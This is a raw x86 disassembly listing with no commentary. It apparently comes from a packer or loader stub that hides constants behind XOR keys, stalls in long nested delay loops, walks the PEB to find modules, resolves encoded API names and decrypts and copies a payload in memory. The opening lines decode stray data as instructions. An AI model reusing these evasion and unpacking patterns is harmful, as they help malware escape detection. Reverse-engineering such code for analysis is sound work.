  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
